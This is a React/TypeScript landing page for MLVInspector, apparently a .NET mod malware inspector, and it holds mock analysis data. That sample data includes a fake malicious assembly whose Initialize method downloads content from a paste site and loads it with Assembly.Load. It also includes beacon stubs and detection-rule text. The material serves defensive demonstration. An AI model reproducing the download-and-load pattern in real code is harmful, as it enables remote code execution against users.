import { useState } from "react"
import { Code, Download, Search, Shield, X, Zap } from "lucide-react"

import "../components/inspector/inspector.css"

type ViewMode = "il" | "csharp"
type Severity = "High" | "Medium" | "Low"
type TokenKind = "keyword" | "type" | "string" | "comment" | "number" | "plain"

type MockToken = {
  text: string
  kind?: TokenKind
}

type MockIlRow = {
  offset: string
  opCode: string
  operand: string
}

type MockMethod = {
  id: string
  name: string
  typeId: string
  typeName: string
  signature: string
  ilRows: MockIlRow[]
  csharpLines: MockToken[][]
}

type MockType = {
  id: string
  displayName: string
  fullName: string
  methods: MockMethod[]
  csharpLines: MockToken[][]
}

type MockNamespace = {
  id: string
  name: string
  types: MockType[]
}

type MockFinding = {
  id: string
  ruleId: string
  severity: Severity
  location: string
  methodId: string
  description: string
  codeSnippet: string[]
  highlightedOffsets: string[]
  highlightedLines: number[]
}

type MockAssembly = {
  id: string
  name: string
  path: string
  namespaces: MockNamespace[]
  findings: MockFinding[]
}

type MockTab = {
  id: string
  kind: "type" | "method"
  title: string
  subtitle: string
  typeId: string
  methodId?: string
}

const featureCards = [
  {
    icon: Search,
    title: "Unified Explorer",
    description:
      "Browse assemblies, namespaces, types, and methods from one sidebar modeled after the desktop inspector.",
  },
  {
    icon: Shield,
    title: "Finding-Driven Triage",
    description:
      "Jump from high-severity detections into the exact method body, with findings and detail panes kept side by side.",
  },
  {
    icon: Zap,
    title: "IL and C# Workflow",
    description:
      "Switch between raw IL and readable C# views in a tabbed workspace designed for quick reverse-engineering sessions.",
  },
] as const

const mockAssemblies: MockAssembly[] = [
  {
    id: "asm-suspicious",
    name: "SuspiciousMod.dll",
    path: "C:\\Mods\\SuspiciousMod.dll",
    namespaces: [
      {
        id: "ns-loader-payload",
        name: "Loader.Payload",
        types: [
          {
            id: "type-bootstrapper",
            displayName: "Bootstrapper",
            fullName: "Loader.Payload.Bootstrapper",
            methods: [
              {
                id: "method-initialize",
                name: "Initialize",
                typeId: "type-bootstrapper",
                typeName: "Loader.Payload.Bootstrapper",
                signature: "System.Void Loader.Payload.Bootstrapper::Initialize()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldstr", operand: '"https://paste.rs/raw"' },
                  {
                    offset: "IL_0005",
                    opCode: "call",
                    operand: "System.Net.WebClient::DownloadString",
                  },
                  { offset: "IL_000A", opCode: "stloc.0", operand: "payload" },
                  {
                    offset: "IL_0014",
                    opCode: "callvirt",
                    operand: "System.Reflection.Assembly::Load",
                  },
                  { offset: "IL_0021", opCode: "ret", operand: "" },
                ],
                csharpLines: [
                  [{ text: "public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "Initialize", kind: "plain" }, { text: "()", kind: "plain" }],
                  [{ text: "{", kind: "plain" }],
                  [{ text: "    var ", kind: "keyword" }, { text: "url ", kind: "plain" }, { text: "= ", kind: "plain" }, { text: '"https://paste.rs/raw"', kind: "string" }, { text: ";", kind: "plain" }],
                  [{ text: "    var ", kind: "keyword" }, { text: "payload ", kind: "plain" }, { text: "= ", kind: "plain" }, { text: "new ", kind: "keyword" }, { text: "WebClient", kind: "type" }, { text: "().DownloadString(url);", kind: "plain" }],
                  [{ text: "    Assembly", kind: "type" }, { text: ".Load(payload);", kind: "plain" }],
                  [{ text: "}", kind: "plain" }],
                ],
              },
              {
                id: "method-run-async",
                name: "RunAsync",
                typeId: "type-bootstrapper",
                typeName: "Loader.Payload.Bootstrapper",
                signature: "System.Threading.Tasks.Task Loader.Payload.Bootstrapper::RunAsync()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldarg.0", operand: "this" },
                  { offset: "IL_0001", opCode: "call", operand: "Loader.Payload.Bootstrapper::Initialize" },
                  { offset: "IL_0006", opCode: "call", operand: "Loader.Payload.BeaconClient::Ping" },
                  { offset: "IL_0010", opCode: "ret", operand: "" },
                ],
                csharpLines: [
                  [{ text: "public ", kind: "keyword" }, { text: "async ", kind: "keyword" }, { text: "Task ", kind: "type" }, { text: "RunAsync", kind: "plain" }, { text: "()", kind: "plain" }],
                  [{ text: "{", kind: "plain" }],
                  [{ text: "    ", kind: "plain" }, { text: "Initialize", kind: "plain" }, { text: "();", kind: "plain" }],
                  [{ text: "    await ", kind: "keyword" }, { text: "_client", kind: "plain" }, { text: ".Ping();", kind: "plain" }],
                  [{ text: "}", kind: "plain" }],
                ],
              },
              {
                id: "method-load-stage",
                name: "LoadStage",
                typeId: "type-bootstrapper",
                typeName: "Loader.Payload.Bootstrapper",
                signature: "System.Byte[] Loader.Payload.Bootstrapper::LoadStage()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldsfld", operand: "stageBytes" },
                  { offset: "IL_0004", opCode: "ret", operand: "" },
                ],
                csharpLines: [
                  [{ text: "private ", kind: "keyword" }, { text: "byte[] ", kind: "type" }, { text: "LoadStage", kind: "plain" }, { text: "() => _stageBytes;", kind: "plain" }],
                ],
              },
              {
                id: "method-dispose",
                name: "Dispose",
                typeId: "type-bootstrapper",
                typeName: "Loader.Payload.Bootstrapper",
                signature: "System.Void Loader.Payload.Bootstrapper::Dispose()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldarg.0", operand: "this" },
                  { offset: "IL_0001", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "Dispose", kind: "plain" }, { text: "() { }", kind: "plain" }]],
              },
            ],
            csharpLines: [
              [{ text: "public sealed ", kind: "keyword" }, { text: "class ", kind: "keyword" }, { text: "Bootstrapper", kind: "type" }],
              [{ text: "{", kind: "plain" }],
              [{ text: "    private readonly ", kind: "keyword" }, { text: "BeaconClient ", kind: "type" }, { text: "_client;", kind: "plain" }],
              [{ text: "    public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "Initialize", kind: "plain" }, { text: "();", kind: "plain" }],
              [{ text: "    public ", kind: "keyword" }, { text: "Task ", kind: "type" }, { text: "RunAsync", kind: "plain" }, { text: "();", kind: "plain" }],
              [{ text: "}", kind: "plain" }],
            ],
          },
          {
            id: "type-beacon-client",
            displayName: "BeaconClient",
            fullName: "Loader.Payload.BeaconClient",
            methods: [
              {
                id: "method-ping",
                name: "Ping",
                typeId: "type-beacon-client",
                typeName: "Loader.Payload.BeaconClient",
                signature: "System.Threading.Tasks.Task Loader.Payload.BeaconClient::Ping()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldstr", operand: '"/ping"' },
                  { offset: "IL_0005", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "public ", kind: "keyword" }, { text: "Task ", kind: "type" }, { text: "Ping", kind: "plain" }, { text: "() => _http.GetAsync(\"/ping\");", kind: "plain" }]],
              },
              {
                id: "method-push-stage",
                name: "PushStage",
                typeId: "type-beacon-client",
                typeName: "Loader.Payload.BeaconClient",
                signature: "System.Void Loader.Payload.BeaconClient::PushStage(System.Byte[])",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldarg.1", operand: "buffer" },
                  { offset: "IL_0004", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "PushStage", kind: "plain" }, { text: "(byte[] buffer) { }", kind: "plain" }]],
              },
            ],
            csharpLines: [[{ text: "internal sealed ", kind: "keyword" }, { text: "class ", kind: "keyword" }, { text: "BeaconClient", kind: "type" }, { text: " { }", kind: "plain" }]],
          },
        ],
      },
      {
        id: "ns-loader-utils",
        name: "Loader.Utils",
        types: [
          {
            id: "type-path-helper",
            displayName: "PathHelper",
            fullName: "Loader.Utils.PathHelper",
            methods: [
              {
                id: "method-resolve-data-dir",
                name: "ResolveDataDir",
                typeId: "type-path-helper",
                typeName: "Loader.Utils.PathHelper",
                signature: "System.String Loader.Utils.PathHelper::ResolveDataDir()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldstr", operand: '"UserData"' },
                  { offset: "IL_0005", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "internal static ", kind: "keyword" }, { text: "string ", kind: "type" }, { text: "ResolveDataDir", kind: "plain" }, { text: "() => \"UserData\";", kind: "plain" }]],
              },
            ],
            csharpLines: [[{ text: "internal static ", kind: "keyword" }, { text: "class ", kind: "keyword" }, { text: "PathHelper", kind: "type" }, { text: " { }", kind: "plain" }]],
          },
        ],
      },
      {
        id: "ns-loader-staging",
        name: "Loader.Staging",
        types: [
          {
            id: "type-stage-cache",
            displayName: "StageCache",
            fullName: "Loader.Staging.StageCache",
            methods: [
              {
                id: "method-prime",
                name: "Prime",
                typeId: "type-stage-cache",
                typeName: "Loader.Staging.StageCache",
                signature: "System.Void Loader.Staging.StageCache::Prime()",
                ilRows: [
                  { offset: "IL_0000", opCode: "nop", operand: "" },
                  { offset: "IL_0001", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "Prime", kind: "plain" }, { text: "() { }", kind: "plain" }]],
              },
            ],
            csharpLines: [[{ text: "internal sealed ", kind: "keyword" }, { text: "class ", kind: "keyword" }, { text: "StageCache", kind: "type" }, { text: " { }", kind: "plain" }]],
          },
        ],
      },
    ],
    findings: [
      {
        id: "finding-remote-load",
        ruleId: "AssemblyDynamicLoadRule",
        severity: "High",
        location: "Loader.Payload.Bootstrapper::Initialize",
        methodId: "method-initialize",
        description:
          "Detected dynamic assembly loading via System.Reflection.Assembly.Load. This pattern is commonly used by malware to load encrypted or remotely fetched payloads without touching disk.",
        codeSnippet: ["ldstr \"https://paste.rs/raw\"", "call DownloadString", "callvirt Assembly.Load"],
        highlightedOffsets: ["IL_0005", "IL_0014"],
        highlightedLines: [3, 4, 5],
      },
      {
        id: "finding-beacon",
        ruleId: "ProcessStartRule",
        severity: "Medium",
        location: "Loader.Payload.Bootstrapper::RunAsync",
        methodId: "method-run-async",
        description:
          "Detected Process.Start call to an unknown external target. This could indicate beacon-style callback behavior or lateral movement attempts.",
        codeSnippet: ["call Loader.Payload.BeaconClient::Ping", "await _client.Ping();"],
        highlightedOffsets: ["IL_0006"],
        highlightedLines: [4],
      },
      {
        id: "finding-stage-cache",
        ruleId: "ByteArrayManipulationRule",
        severity: "Low",
        location: "Loader.Payload.Bootstrapper::LoadStage",
        methodId: "method-load-stage",
        description:
          "Detected manipulation of byte arrays for staging payloads. Often used to construct malicious executables in memory before execution.",
        codeSnippet: ["ldsfld stageBytes", "ret"],
        highlightedOffsets: ["IL_0000"],
        highlightedLines: [1],
      },
    ],
  },
  {
    id: "asm-helper-runtime",
    name: "Helper.Runtime.dll",
    path: "C:\\Mods\\Helper.Runtime.dll",
    namespaces: [
      {
        id: "ns-runtime-support",
        name: "Runtime.Support",
        types: [
          {
            id: "type-patch-host",
            displayName: "PatchHost",
            fullName: "Runtime.Support.PatchHost",
            methods: [
              {
                id: "method-attach-hooks",
                name: "AttachHooks",
                typeId: "type-patch-host",
                typeName: "Runtime.Support.PatchHost",
                signature: "System.Void Runtime.Support.PatchHost::AttachHooks()",
                ilRows: [
                  { offset: "IL_0000", opCode: "ldarg.0", operand: "this" },
                  { offset: "IL_0004", opCode: "ret", operand: "" },
                ],
                csharpLines: [[{ text: "public ", kind: "keyword" }, { text: "void ", kind: "type" }, { text: "AttachHooks", kind: "plain" }, { text: "() { }", kind: "plain" }]],
              },
            ],
            csharpLines: [[{ text: "public sealed ", kind: "keyword" }, { text: "class ", kind: "keyword" }, { text: "PatchHost", kind: "type" }, { text: " { }", kind: "plain" }]],
          },
        ],
      },
    ],
    findings: [
      {
        id: "finding-hooks",
        ruleId: "ReflectionRule",
        severity: "Low",
        location: "Runtime.Support.PatchHost::AttachHooks",
        methodId: "method-attach-hooks",
        description:
          "Detected reflection-based runtime hooking or method interception. While common in legitimate mods, this pattern can also be used for malicious method hooking.",
        codeSnippet: ["ldarg.0", "ret"],
        highlightedOffsets: ["IL_0000"],
        highlightedLines: [1],
      },
    ],
  },
]

const defaultAssembly = mockAssemblies[0]

function makeMethodTab(method: MockMethod): MockTab {
  return {
    id: `method:${method.id}`,
    kind: "method",
    title: method.name,
    subtitle: method.typeName,
    typeId: method.typeId,
    methodId: method.id,
  }
}

function makeTypeTab(type: MockType): MockTab {
  return {
    id: `type:${type.id}`,
    kind: "type",
    title: type.displayName,
    subtitle: type.fullName,
    typeId: type.id,
  }
}

function getDefaultTabs(assembly: MockAssembly): MockTab[] {
  const firstType = assembly.namespaces[0]?.types[0]
  if (!firstType) {
    return []
  }

  return firstType.methods.slice(0, 2).map(makeMethodTab)
}

function getDefaultNamespaceIds(assembly: MockAssembly): string[] {
  return assembly.namespaces[0] ? [assembly.namespaces[0].id] : []
}

function getDefaultTypeIds(assembly: MockAssembly): string[] {
  return assembly.namespaces[0]?.types[0] ? [assembly.namespaces[0].types[0].id] : []
}

function findType(assembly: MockAssembly, typeId: string): MockType | undefined {
  for (const namespace of assembly.namespaces) {
    const match = namespace.types.find((type) => type.id === typeId)
    if (match) {
      return match
    }
  }

  return undefined
}

function findMethod(assembly: MockAssembly, methodId: string): MockMethod | undefined {
  for (const namespace of assembly.namespaces) {
    for (const type of namespace.types) {
      const match = type.methods.find((method) => method.id === methodId)
      if (match) {
        return match
      }
    }
  }

  return undefined
}

function countClasses(assembly: MockAssembly): number {
  return assembly.namespaces.reduce((total, namespace) => total + namespace.types.length, 0)
}

function countMethods(assembly: MockAssembly): number {
  return assembly.namespaces.reduce(
    (total, namespace) =>
      total + namespace.types.reduce((typeTotal, type) => typeTotal + type.methods.length, 0),
    0,
  )
}

function severityClass(severity: Severity): string {
  switch (severity) {
    case "High":
      return "danger"
    case "Medium":
      return "amber"
    default:
      return "muted"
  }
}

function InspectorPage() {
  const [selectedAssemblyId, setSelectedAssemblyId] = useState(defaultAssembly.id)
  const [openTabs, setOpenTabs] = useState<MockTab[]>(() => getDefaultTabs(defaultAssembly))
  const [activeTabId, setActiveTabId] = useState<string | null>(() => getDefaultTabs(defaultAssembly)[0]?.id ?? null)
  const [selectedFindingId, setSelectedFindingId] = useState<string | null>(
    defaultAssembly.findings[0]?.id ?? null,
  )
  const [viewMode, setViewMode] = useState<ViewMode>("il")
  const [isAssemblyExpanded, setIsAssemblyExpanded] = useState(true)
  const [expandedNamespaceIds, setExpandedNamespaceIds] = useState<Set<string>>(
    () => new Set(getDefaultNamespaceIds(defaultAssembly)),
  )
  const [expandedTypeIds, setExpandedTypeIds] = useState<Set<string>>(
    () => new Set(getDefaultTypeIds(defaultAssembly)),
  )

  const selectedAssembly =
    mockAssemblies.find((assembly) => assembly.id === selectedAssemblyId) ?? defaultAssembly

  const activeTab = openTabs.find((tab) => tab.id === activeTabId) ?? null
  const activeType = activeTab ? findType(selectedAssembly, activeTab.typeId) ?? null : null
  const activeMethod =
    activeTab?.kind === "method" && activeTab.methodId
      ? findMethod(selectedAssembly, activeTab.methodId) ?? null
      : null
  const selectedFinding =
    selectedAssembly.findings.find((finding) => finding.id === selectedFindingId) ?? null

  const relevantFinding =
    activeMethod && selectedFinding?.methodId === activeMethod.id ? selectedFinding : null

  const methodFindingCounts = new Map<string, number>()
  for (const finding of selectedAssembly.findings) {
    methodFindingCounts.set(finding.methodId, (methodFindingCounts.get(finding.methodId) ?? 0) + 1)
  }

  const explorerBadge = `${mockAssemblies.length} asm / ${countClasses(selectedAssembly)} cls / ${selectedAssembly.namespaces.length} ns`
  const methodCount = countMethods(selectedAssembly)

  const selectAssembly = (assembly: MockAssembly) => {
    const defaultTabs = getDefaultTabs(assembly)
    setSelectedAssemblyId(assembly.id)
    setOpenTabs(defaultTabs)
    setActiveTabId(defaultTabs[0]?.id ?? null)
    setSelectedFindingId(assembly.findings[0]?.id ?? null)
    setViewMode("il")
    setIsAssemblyExpanded(true)
    setExpandedNamespaceIds(new Set(getDefaultNamespaceIds(assembly)))
    setExpandedTypeIds(new Set(getDefaultTypeIds(assembly)))
  }

  const openTab = (tab: MockTab, options?: { preserveFinding?: boolean }) => {
    setOpenTabs((currentTabs) => {
      if (currentTabs.some((currentTab) => currentTab.id === tab.id)) {
        return currentTabs
      }
      return [...currentTabs, tab]
    })
    setActiveTabId(tab.id)
    if (!options?.preserveFinding) {
      setSelectedFindingId(null)
    }
  }

  const openTypeTab = (type: MockType) => {
    openTab(makeTypeTab(type))
    setExpandedTypeIds((current) => new Set(current).add(type.id))
  }

  const openMethodTab = (method: MockMethod, options?: { preserveFinding?: boolean }) => {
    openTab(makeMethodTab(method), options)
  }

  const closeTab = (tabId: string) => {
    setOpenTabs((currentTabs) => {
      const nextTabs = currentTabs.filter((tab) => tab.id !== tabId)
      if (activeTabId === tabId) {
        setActiveTabId(nextTabs[nextTabs.length - 1]?.id ?? null)
        setSelectedFindingId(null)
      }
      return nextTabs
    })
  }

  const toggleNamespace = (namespaceId: string) => {
    setExpandedNamespaceIds((current) => {
      const next = new Set(current)
      if (next.has(namespaceId)) {
        next.delete(namespaceId)
      } else {
        next.add(namespaceId)
      }
      return next
    })
  }

  const toggleType = (typeId: string) => {
    setExpandedTypeIds((current) => {
      const next = new Set(current)
      if (next.has(typeId)) {
        next.delete(typeId)
      } else {
        next.add(typeId)
      }
      return next
    })
  }

  const selectFinding = (finding: MockFinding) => {
    const method = findMethod(selectedAssembly, finding.methodId)
    setSelectedFindingId(finding.id)
    if (method) {
      openMethodTab(method, { preserveFinding: true })
    }
  }

  const renderTokens = (line: MockToken[], lineIndex: number, highlightedLines: number[]) => {
    const isHighlighted = highlightedLines.includes(lineIndex + 1)
    return (
      <span key={`line-${lineIndex}`} className={`mock-csharp-line${isHighlighted ? " highlighted" : ""}`}>
        {line.map((token, tokenIndex) => (
          <span
            key={`token-${lineIndex}-${tokenIndex}`}
            className={token.kind && token.kind !== "plain" ? `mock-token-${token.kind}` : undefined}
          >
            {token.text}
          </span>
        ))}
      </span>
    )
  }

  return (
    <div className="inspector-page">
      <section className="inspector-hero">
        <div className="inspector-shell inspector-hero-grid">
          <div className="inspector-copy">
            <div className="inspector-kicker">Desktop Inspector</div>
            <h1 className="inspector-h1">MLVInspector for fast local assembly triage.</h1>
            <p className="inspector-subtext">
              Inspect suspicious .NET mods in a purpose-built desktop workspace with an explorer
              tree, tabbed IL and C# views, and findings that stay anchored to real code.
            </p>

            <div className="inspector-actions">
              <a href="https://github.com/ifBars/MLVInspector/releases" className="btn-primary">
                <Download size={18} />
                Download for Windows
              </a>
              <a href="https://github.com/ifBars/MLVInspector" className="btn-ghost">
                <Code size={18} />
                View Source
              </a>
            </div>

            <div className="inspector-meta-row">
              <div className="inspector-meta-card">
                <span className="inspector-meta-label">Built with</span>
                <span className="inspector-meta-value">Rust + Dioxus</span>
              </div>
              <div className="inspector-meta-card">
                <span className="inspector-meta-label">Analysis core</span>
                <span className="inspector-meta-value">MLVScan.Core</span>
              </div>
              <div className="inspector-meta-card">
                <span className="inspector-meta-label">Target</span>
                <span className="inspector-meta-value">Windows desktop</span>
              </div>
            </div>
          </div>

          <div className="inspector-demo-frame">
            <div className="inspector-window-bar">
              <div className="inspector-window-dots">
                <span></span>
                <span></span>
                <span></span>
              </div>
              <div className="inspector-window-title">MLVInspector - Analysis Workspace</div>
            </div>

            <div className="inspector-demo-body">
              <aside className="explorer-pane">
                <div className="mock-panel-header">
                  <span>Explorer</span>
                  <span className="mock-badge">{explorerBadge}</span>
                </div>

                <div className="explorer-scroll">
                  <div className="explorer-section">
                    <div className="mock-section-row">
                      <span>Assemblies</span>
                      <span className="mock-badge">{mockAssemblies.length}</span>
                    </div>

                    {mockAssemblies.map((assembly) => (
                      <button
                        key={assembly.id}
                        className={`mock-assembly${assembly.id === selectedAssembly.id ? " active" : ""}`}
                        type="button"
                        onClick={() => selectAssembly(assembly)}
                      >
                        <div className="mock-assembly-top">
                          <span
                            className={`mock-status-dot${assembly.id === selectedAssembly.id ? "" : " muted"}`}
                          ></span>
                          <span className="mock-assembly-name">{assembly.name}</span>
                        </div>
                        <div className="mock-assembly-path">{assembly.path}</div>
                      </button>
                    ))}
                  </div>

                  <div className="explorer-section explorer-tree">
                    <div className="mock-section-row compact">
                      <span>Contents</span>
                      <span className="mock-inline-text">{methodCount} methods</span>
                    </div>

                    <button
                      className="mock-tree-item strong"
                      type="button"
                      onClick={() => setIsAssemblyExpanded((current) => !current)}
                    >
                      <span className="mock-chevron">{isAssemblyExpanded ? "v" : ">"}</span>
                      <span className="mock-tree-label">{selectedAssembly.name}</span>
                      <span className="mock-inline-text">{selectedAssembly.namespaces.length} ns</span>
                    </button>

                    {isAssemblyExpanded &&
                      selectedAssembly.namespaces.map((namespace) => {
                        const isNamespaceExpanded = expandedNamespaceIds.has(namespace.id)

                        return (
                          <div key={namespace.id}>
                            <button
                              className="mock-tree-item nested"
                              type="button"
                              onClick={() => toggleNamespace(namespace.id)}
                            >
                              <span className="mock-chevron">{isNamespaceExpanded ? "v" : ">"}</span>
                              <span className="mock-tree-label">{namespace.name}</span>
                              <span className="mock-inline-text">{namespace.types.length}</span>
                            </button>

                            {isNamespaceExpanded &&
                              namespace.types.map((type) => {
                                const isTypeExpanded = expandedTypeIds.has(type.id)
                                const isTypeActive = activeTab?.kind === "type" && activeTab.typeId === type.id

                                return (
                                  <div key={type.id}>
                                    <div className="mock-type-row">
                                      <button
                                        className="mock-toggle"
                                        type="button"
                                        onClick={() => toggleType(type.id)}
                                      >
                                        {isTypeExpanded ? "v" : ">"}
                                      </button>
                                      <button
                                        className={`mock-type-card${isTypeActive ? " active" : ""}`}
                                        type="button"
                                        onClick={() => openTypeTab(type)}
                                      >
                                        <span>{type.displayName}</span>
                                        <span className="mock-inline-text">{type.methods.length}</span>
                                      </button>
                                    </div>

                                    {isTypeExpanded &&
                                      type.methods.map((method) => {
                                        const isMethodActive =
                                          activeTab?.kind === "method" && activeTab.methodId === method.id

                                        return (
                                          <button
                                            key={method.id}
                                            className={`mock-method${isMethodActive ? " active" : ""}`}
                                            type="button"
                                            onClick={() => openMethodTab(method)}
                                          >
                                            <div className="mock-method-top">
                                              <span className="mock-method-name">{method.name}</span>
                                              {(methodFindingCounts.get(method.id) ?? 0) > 0 && (
                                                <span className="mock-method-badge">
                                                  {methodFindingCounts.get(method.id)}
                                                </span>
                                              )}
                                            </div>
                                            <span className="mock-method-type">{method.typeName}</span>
                                          </button>
                                        )
                                      })}
                                  </div>
                                )
                              })}
                          </div>
                        )
                      })}
                  </div>
                </div>
              </aside>

              <section className="viewer-pane">
                <div className="mock-panel-header">
                  <span>{viewMode === "csharp" ? "C# View" : "IL View"}</span>
                  <div className="mock-toggle-group">
                    <button
                      className={`mock-toggle-chip${viewMode === "il" ? " active" : ""}`}
                      type="button"
                      onClick={() => setViewMode("il")}
                    >
                      IL
                    </button>
                    <button
                      className={`mock-toggle-chip${viewMode === "csharp" ? " active" : ""}`}
                      type="button"
                      onClick={() => setViewMode("csharp")}
                    >
                      C#
                    </button>
                  </div>
                </div>

                <div className="mock-tabs">
                  {openTabs.length === 0 ? (
                    <span className="mock-empty-note">No open tabs</span>
                  ) : (
                    openTabs.map((tab) => (
                      <div
                        key={tab.id}
                        className={`mock-tab${tab.id === activeTabId ? " active" : ""}`}
                        onClick={() => {
                          setActiveTabId(tab.id)
                          setSelectedFindingId(null)
                        }}
                      >
                        <div className="mock-tab-content">
                          <span className="mock-tab-title">{tab.title}</span>
                          <span className="mock-tab-subtitle">{tab.subtitle}</span>
                        </div>
                        <button
                          className="mock-tab-close"
                          type="button"
                          aria-label="Close tab"
                          onClick={(event) => {
                            event.stopPropagation()
                            closeTab(tab.id)
                          }}
                        >
                          <X size={10} />
                        </button>
                      </div>
                    ))
                  )}
                </div>

                <div className="mock-viewer-scroll">
                  {!activeTab ? (
                    <div className="mock-empty-state">
                      <p>Open a type or method from the explorer to inspect IL and C# output.</p>
                    </div>
                  ) : activeTab.kind === "type" && activeType ? (
                    viewMode === "il" ? (
                      <>
                        <div className="mock-code-summary">
                          <div className="mock-code-title">{activeType.fullName}</div>
                          <div className="mock-code-signature">{activeType.methods.length} methods</div>
                        </div>
                        <div className="mock-class-overview">
                          {activeType.methods.map((method) => (
                            <button
                              key={method.id}
                              className="mock-class-method-card"
                              type="button"
                              onClick={() => openMethodTab(method)}
                            >
                              <div className="mock-class-method-header">
                                <span className="mock-class-method-name">{method.name}</span>
                                {(methodFindingCounts.get(method.id) ?? 0) > 0 && (
                                  <span className="mock-method-badge">
                                    {methodFindingCounts.get(method.id)} finding
                                  </span>
                                )}
                              </div>
                              <div className="mock-class-method-signature">{method.signature}</div>
                            </button>
                          ))}
                        </div>
                      </>
                    ) : (
                      <div className="mock-csharp-source">
                        {activeType.csharpLines.map((line, lineIndex) => renderTokens(line, lineIndex, []))}
                      </div>
                    )
                  ) : activeMethod ? (
                    viewMode === "il" ? (
                      <>
                        <div className="mock-code-summary">
                          <div className="mock-code-title">{activeMethod.name}</div>
                          <div className="mock-code-signature">{activeMethod.signature}</div>
                        </div>

                        <div className="mock-il-list">
                          {activeMethod.ilRows.map((row) => (
                            <div
                              key={row.offset}
                              className={`mock-il-row${relevantFinding?.highlightedOffsets.includes(row.offset) ? " highlighted" : ""}`}
                            >
                              <span className="offset">{row.offset}</span>
                              <span className="opcode">{row.opCode}</span>
                              <span className="operand">{row.operand}</span>
                            </div>
                          ))}
                        </div>
                      </>
                    ) : (
                      <div className="mock-csharp-source">
                        {activeMethod.csharpLines.map((line, lineIndex) =>
                          renderTokens(
                            line,
                            lineIndex,
                            relevantFinding?.highlightedLines ?? [],
                          ),
                        )}
                      </div>
                    )
                  ) : null}
                </div>
              </section>

              <aside className="findings-pane">
                <div className="mock-panel-header">
                  <span>Findings</span>
                  <span className="mock-badge warning">{selectedAssembly.findings.length}</span>
                </div>

                <div className="findings-scroll">
                  {selectedAssembly.findings.map((finding) => (
                    <button
                      key={finding.id}
                      className={`mock-finding${finding.id === selectedFindingId ? " active" : ""}`}
                      type="button"
                      onClick={() => selectFinding(finding)}
                    >
                      <div className="mock-finding-top">
                        <span className="mock-rule-id">{finding.ruleId}</span>
                        <span className={`mock-severity ${severityClass(finding.severity)}`}>
                          {finding.severity}
                        </span>
                      </div>
                      <div className="mock-finding-location">{finding.location}</div>
                    </button>
                  ))}

                  {selectedFinding && (
                    <div className="mock-detail-card">
                      <div className="mock-detail-label">Detail</div>
                      <p>{selectedFinding.description}</p>
                      <pre>{selectedFinding.codeSnippet.join("\n")}</pre>
                    </div>
                  )}
                </div>
              </aside>
            </div>
          </div>
        </div>
      </section>

      <section className="inspector-feature-section">
        <div className="inspector-shell">
          <div className="inspector-features">
            {featureCards.map(({ icon: Icon, title, description }) => (
              <div key={title} className="inspector-panel">
                <Icon className="inspector-panel-icon" />
                <h3 className="inspector-panel-title">{title}</h3>
                <p className="inspector-panel-desc">{description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      <section className="inspector-cta-section">
        <div className="inspector-shell inspector-cta-card">
          <div>
            <div className="inspector-kicker">Local-first analysis</div>
            <h2>Open assemblies, inspect findings, and view code in the desktop app.</h2>
          </div>
          <a href="https://github.com/ifBars/MLVScan/releases" className="btn-primary">
            Download
          </a>
        </div>
      </section>
    </div>
  )
}

export default InspectorPage
